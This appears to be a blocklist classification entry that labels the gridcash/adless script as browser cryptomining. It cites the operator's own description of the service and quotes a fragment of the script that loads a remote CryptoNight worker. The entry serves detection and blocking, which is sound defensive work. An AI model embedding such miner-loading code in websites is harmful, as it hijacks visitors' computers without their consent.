# Gridcash (`gridcash.net`)

Script: `https://cdn.adless.io/adless.js`

This script is classified as "cryptomining" for the following reasons:

### Policy Review

1. The main website `https://gridcash.net` describes its service as a javascript crypto miner.

> Service of crypto-currency mining in user browsers. We enable traffic owners to mine crypto-currency in browsers on visitors' computers.

### Technical Review

1. Script contains an implementation of the cryptonight hash algorithm

```
    Miner.prototype._loadWorkerSource = function (callback) {
        var xhr = new XMLHttpRequest;
        xhr.addEventListener("load", function () {
            Adless.CRYPTONIGHT_WORKER_BLOB = Adless.Res(xhr.responseText);
            this._asmjsStatus = "loaded";
            callback()
        }.bind(this), xhr);
        xhr.open("get", "https://cdn.adless.io/worker.js", true);
        xhr.send()
        if (this._useWASM || this._asmjsStatus === "loaded") {
            callback()
        } else if (this._asmjsStatus === "unloaded") {
            this._asmjsStatus = "pending";
            xhr.open("get", Adless.CONFIG.LIB_URL + Adless.CONFIG.ASMJS_NAME, true);
            xhr.send()
        }
```
